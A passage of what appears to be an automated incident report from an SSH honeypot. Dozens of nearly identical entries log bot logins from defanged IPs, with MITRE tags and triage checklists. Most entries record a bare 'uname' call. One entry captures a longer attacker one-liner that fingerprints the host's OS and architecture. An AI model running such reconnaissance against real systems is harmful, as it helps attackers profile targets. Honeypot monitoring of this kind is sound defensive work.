| `2026-07-21 04:05:03` | `cowrie.session.connect` |
| `2026-07-21 04:05:03` | `cowrie.client.version` |
| `2026-07-21 04:05:03` | `cowrie.client.kex` |
| `2026-07-21 04:05:04` | `cowrie.login.success` |
| `2026-07-21 04:05:04` | `cowrie.session.params` |
| `2026-07-21 04:05:04` | `cowrie.command.input` |
| `2026-07-21 04:05:04` | `cowrie.log.closed` |
| `2026-07-21 04:05:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b2288d4a9c6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:05 |
| **Last Seen** | 2026-07-21 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:05:08` | `cowrie.session.connect` |
| `2026-07-21 04:05:08` | `cowrie.client.version` |
| `2026-07-21 04:05:08` | `cowrie.client.kex` |
| `2026-07-21 04:05:09` | `cowrie.login.success` |
| `2026-07-21 04:05:09` | `cowrie.session.params` |
| `2026-07-21 04:05:10` | `cowrie.command.input` |
| `2026-07-21 04:05:10` | `cowrie.log.closed` |
| `2026-07-21 04:05:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7ca68d5fd70

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:05 |
| **Last Seen** | 2026-07-21 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:05:13` | `cowrie.session.connect` |
| `2026-07-21 04:05:13` | `cowrie.client.version` |
| `2026-07-21 04:05:13` | `cowrie.client.kex` |
| `2026-07-21 04:05:14` | `cowrie.login.success` |
| `2026-07-21 04:05:14` | `cowrie.session.params` |
| `2026-07-21 04:05:14` | `cowrie.command.input` |
| `2026-07-21 04:05:15` | `cowrie.log.closed` |
| `2026-07-21 04:05:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61faf9a3dfb4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:05 |
| **Last Seen** | 2026-07-21 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:05:18` | `cowrie.session.connect` |
| `2026-07-21 04:05:18` | `cowrie.client.version` |
| `2026-07-21 04:05:18` | `cowrie.client.kex` |
| `2026-07-21 04:05:19` | `cowrie.login.success` |
| `2026-07-21 04:05:20` | `cowrie.session.params` |
| `2026-07-21 04:05:20` | `cowrie.command.input` |
| `2026-07-21 04:05:20` | `cowrie.log.closed` |
| `2026-07-21 04:05:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc84ed5ed1e8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:05 |
| **Last Seen** | 2026-07-21 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:05:23` | `cowrie.session.connect` |
| `2026-07-21 04:05:23` | `cowrie.client.version` |
| `2026-07-21 04:05:23` | `cowrie.client.kex` |
| `2026-07-21 04:05:24` | `cowrie.login.success` |
| `2026-07-21 04:05:25` | `cowrie.session.params` |
| `2026-07-21 04:05:25` | `cowrie.command.input` |
| `2026-07-21 04:05:25` | `cowrie.log.closed` |
| `2026-07-21 04:05:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f628e9310f59

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:05 |
| **Last Seen** | 2026-07-21 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:05:28` | `cowrie.session.connect` |
| `2026-07-21 04:05:28` | `cowrie.client.version` |
| `2026-07-21 04:05:28` | `cowrie.client.kex` |
| `2026-07-21 04:05:29` | `cowrie.login.success` |
| `2026-07-21 04:05:30` | `cowrie.session.params` |
| `2026-07-21 04:05:30` | `cowrie.command.input` |
| `2026-07-21 04:05:30` | `cowrie.log.closed` |
| `2026-07-21 04:05:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c67e20967cbe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:05 |
| **Last Seen** | 2026-07-21 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:05:33` | `cowrie.session.connect` |
| `2026-07-21 04:05:33` | `cowrie.client.version` |
| `2026-07-21 04:05:33` | `cowrie.client.kex` |
| `2026-07-21 04:05:34` | `cowrie.login.success` |
| `2026-07-21 04:05:34` | `cowrie.session.params` |
| `2026-07-21 04:05:34` | `cowrie.command.input` |
| `2026-07-21 04:05:35` | `cowrie.log.closed` |
| `2026-07-21 04:05:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-124776d77096

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:05 |
| **Last Seen** | 2026-07-21 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:05:38` | `cowrie.session.connect` |
| `2026-07-21 04:05:38` | `cowrie.client.version` |
| `2026-07-21 04:05:38` | `cowrie.client.kex` |
| `2026-07-21 04:05:38` | `cowrie.login.success` |
| `2026-07-21 04:05:39` | `cowrie.session.params` |
| `2026-07-21 04:05:39` | `cowrie.command.input` |
| `2026-07-21 04:05:39` | `cowrie.log.closed` |
| `2026-07-21 04:05:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96da67f2e0fd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:05 |
| **Last Seen** | 2026-07-21 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:05:43` | `cowrie.session.connect` |
| `2026-07-21 04:05:43` | `cowrie.client.version` |
| `2026-07-21 04:05:43` | `cowrie.client.kex` |
| `2026-07-21 04:05:43` | `cowrie.login.success` |
| `2026-07-21 04:05:44` | `cowrie.session.params` |
| `2026-07-21 04:05:44` | `cowrie.command.input` |
| `2026-07-21 04:05:44` | `cowrie.log.closed` |
| `2026-07-21 04:05:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0684c205d3a6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:05 |
| **Last Seen** | 2026-07-21 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:05:47` | `cowrie.session.connect` |
| `2026-07-21 04:05:47` | `cowrie.client.version` |
| `2026-07-21 04:05:48` | `cowrie.client.kex` |
| `2026-07-21 04:05:48` | `cowrie.login.success` |
| `2026-07-21 04:05:49` | `cowrie.session.params` |
| `2026-07-21 04:05:49` | `cowrie.command.input` |
| `2026-07-21 04:05:49` | `cowrie.log.closed` |
| `2026-07-21 04:05:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7434a7b9d9d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:05 |
| **Last Seen** | 2026-07-21 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:05:52` | `cowrie.session.connect` |
| `2026-07-21 04:05:52` | `cowrie.client.version` |
| `2026-07-21 04:05:52` | `cowrie.client.kex` |
| `2026-07-21 04:05:53` | `cowrie.login.success` |
| `2026-07-21 04:05:53` | `cowrie.session.params` |
| `2026-07-21 04:05:53` | `cowrie.command.input` |
| `2026-07-21 04:05:54` | `cowrie.log.closed` |
| `2026-07-21 04:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-982d37e680c7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:05 |
| **Last Seen** | 2026-07-21 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:05:57` | `cowrie.session.connect` |
| `2026-07-21 04:05:57` | `cowrie.client.version` |
| `2026-07-21 04:05:57` | `cowrie.client.kex` |
| `2026-07-21 04:05:58` | `cowrie.login.success` |
| `2026-07-21 04:05:59` | `cowrie.session.params` |
| `2026-07-21 04:05:59` | `cowrie.command.input` |
| `2026-07-21 04:05:59` | `cowrie.log.closed` |
| `2026-07-21 04:05:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da0edc061356

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:06 |
| **Last Seen** | 2026-07-21 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:06:02` | `cowrie.session.connect` |
| `2026-07-21 04:06:02` | `cowrie.client.version` |
| `2026-07-21 04:06:02` | `cowrie.client.kex` |
| `2026-07-21 04:06:03` | `cowrie.login.success` |
| `2026-07-21 04:06:04` | `cowrie.session.params` |
| `2026-07-21 04:06:04` | `cowrie.command.input` |
| `2026-07-21 04:06:04` | `cowrie.log.closed` |
| `2026-07-21 04:06:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dad1429750a7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:06 |
| **Last Seen** | 2026-07-21 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:06:07` | `cowrie.session.connect` |
| `2026-07-21 04:06:07` | `cowrie.client.version` |
| `2026-07-21 04:06:07` | `cowrie.client.kex` |
| `2026-07-21 04:06:07` | `cowrie.login.success` |
| `2026-07-21 04:06:08` | `cowrie.session.params` |
| `2026-07-21 04:06:08` | `cowrie.command.input` |
| `2026-07-21 04:06:08` | `cowrie.log.closed` |
| `2026-07-21 04:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-138a24989d57

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:06 |
| **Last Seen** | 2026-07-21 04:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:06:11` | `cowrie.session.connect` |
| `2026-07-21 04:06:12` | `cowrie.client.version` |
| `2026-07-21 04:06:12` | `cowrie.client.kex` |
| `2026-07-21 04:06:14` | `cowrie.login.success` |
| `2026-07-21 04:06:17` | `cowrie.session.params` |
| `2026-07-21 04:06:17` | `cowrie.command.input` |
| `2026-07-21 04:06:17` | `cowrie.command.input` |
| `2026-07-21 04:06:17` | `cowrie.command.input` |
| `2026-07-21 04:06:17` | `cowrie.command.input` |
| `2026-07-21 04:06:17` | `cowrie.command.input` |
| `2026-07-21 04:06:17` | `cowrie.command.success` |
| `2026-07-21 04:06:17` | `cowrie.command.input` |
| `2026-07-21 04:06:17` | `cowrie.command.input` |
| `2026-07-21 04:06:17` | `cowrie.command.input` |
| `2026-07-21 04:06:17` | `cowrie.command.input` |
| `2026-07-21 04:06:17` | `cowrie.log.closed` |
| `2026-07-21 04:06:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51ab066b1ba4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:06 |
| **Last Seen** | 2026-07-21 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:06:12` | `cowrie.session.connect` |
| `2026-07-21 04:06:12` | `cowrie.client.version` |
| `2026-07-21 04:06:12` | `cowrie.client.kex` |
| `2026-07-21 04:06:12` | `cowrie.login.success` |
| `2026-07-21 04:06:13` | `cowrie.session.params` |
| `2026-07-21 04:06:13` | `cowrie.command.input` |
| `2026-07-21 04:06:13` | `cowrie.log.closed` |
| `2026-07-21 04:06:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9060c19b5435

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:06 |
| **Last Seen** | 2026-07-21 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:06:17` | `cowrie.session.connect` |
| `2026-07-21 04:06:17` | `cowrie.client.version` |
| `2026-07-21 04:06:17` | `cowrie.client.kex` |
| `2026-07-21 04:06:17` | `cowrie.login.success` |
| `2026-07-21 04:06:18` | `cowrie.session.params` |
| `2026-07-21 04:06:18` | `cowrie.command.input` |
| `2026-07-21 04:06:18` | `cowrie.log.closed` |
| `2026-07-21 04:06:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10d34729df38

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:06 |
| **Last Seen** | 2026-07-21 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:06:22` | `cowrie.session.connect` |
| `2026-07-21 04:06:22` | `cowrie.client.version` |
| `2026-07-21 04:06:22` | `cowrie.client.kex` |
| `2026-07-21 04:06:22` | `cowrie.login.success` |
| `2026-07-21 04:06:23` | `cowrie.session.params` |
| `2026-07-21 04:06:23` | `cowrie.command.input` |
| `2026-07-21 04:06:23` | `cowrie.log.closed` |
| `2026-07-21 04:06:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d22a1b62ead

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:06 |
| **Last Seen** | 2026-07-21 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:06:26` | `cowrie.session.connect` |
| `2026-07-21 04:06:26` | `cowrie.client.version` |
| `2026-07-21 04:06:27` | `cowrie.client.kex` |
| `2026-07-21 04:06:27` | `cowrie.login.success` |
| `2026-07-21 04:06:28` | `cowrie.session.params` |
| `2026-07-21 04:06:28` | `cowrie.command.input` |
| `2026-07-21 04:06:28` | `cowrie.log.closed` |
| `2026-07-21 04:06:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bddd4815d672

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:06 |
| **Last Seen** | 2026-07-21 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:06:32` | `cowrie.session.connect` |
| `2026-07-21 04:06:32` | `cowrie.client.version` |
| `2026-07-21 04:06:32` | `cowrie.client.kex` |
| `2026-07-21 04:06:32` | `cowrie.login.success` |
| `2026-07-21 04:06:33` | `cowrie.session.params` |
| `2026-07-21 04:06:33` | `cowrie.command.input` |
| `2026-07-21 04:06:33` | `cowrie.log.closed` |
| `2026-07-21 04:06:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba7a884dd6ac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:06 |
| **Last Seen** | 2026-07-21 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:06:37` | `cowrie.session.connect` |
| `2026-07-21 04:06:37` | `cowrie.client.version` |
| `2026-07-21 04:06:37` | `cowrie.client.kex` |
| `2026-07-21 04:06:37` | `cowrie.login.success` |
| `2026-07-21 04:06:38` | `cowrie.session.params` |
| `2026-07-21 04:06:38` | `cowrie.command.input` |
| `2026-07-21 04:06:38` | `cowrie.log.closed` |
| `2026-07-21 04:06:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c76fd7457357

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:06 |
| **Last Seen** | 2026-07-21 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:06:41` | `cowrie.session.connect` |
| `2026-07-21 04:06:41` | `cowrie.client.version` |
| `2026-07-21 04:06:41` | `cowrie.client.kex` |
| `2026-07-21 04:06:42` | `cowrie.login.success` |
| `2026-07-21 04:06:43` | `cowrie.session.params` |
| `2026-07-21 04:06:43` | `cowrie.command.input` |
| `2026-07-21 04:06:43` | `cowrie.log.closed` |
| `2026-07-21 04:06:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9c18dc65241

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:06 |
| **Last Seen** | 2026-07-21 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:06:46` | `cowrie.session.connect` |
| `2026-07-21 04:06:46` | `cowrie.client.version` |
| `2026-07-21 04:06:46` | `cowrie.client.kex` |
| `2026-07-21 04:06:47` | `cowrie.login.success` |
| `2026-07-21 04:06:48` | `cowrie.session.params` |
| `2026-07-21 04:06:48` | `cowrie.command.input` |
| `2026-07-21 04:06:48` | `cowrie.log.closed` |
| `2026-07-21 04:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9488ec0dd8c8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:06 |
| **Last Seen** | 2026-07-21 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:06:51` | `cowrie.session.connect` |
| `2026-07-21 04:06:51` | `cowrie.client.version` |
| `2026-07-21 04:06:51` | `cowrie.client.kex` |
| `2026-07-21 04:06:52` | `cowrie.login.success` |
| `2026-07-21 04:06:52` | `cowrie.session.params` |
| `2026-07-21 04:06:52` | `cowrie.command.input` |
| `2026-07-21 04:06:52` | `cowrie.log.closed` |
| `2026-07-21 04:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35056ae1be3e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:06 |
| **Last Seen** | 2026-07-21 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:06:56` | `cowrie.session.connect` |
| `2026-07-21 04:06:56` | `cowrie.client.version` |
| `2026-07-21 04:06:56` | `cowrie.client.kex` |
| `2026-07-21 04:06:57` | `cowrie.login.success` |
| `2026-07-21 04:06:57` | `cowrie.session.params` |
| `2026-07-21 04:06:57` | `cowrie.command.input` |
| `2026-07-21 04:06:57` | `cowrie.log.closed` |
| `2026-07-21 04:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
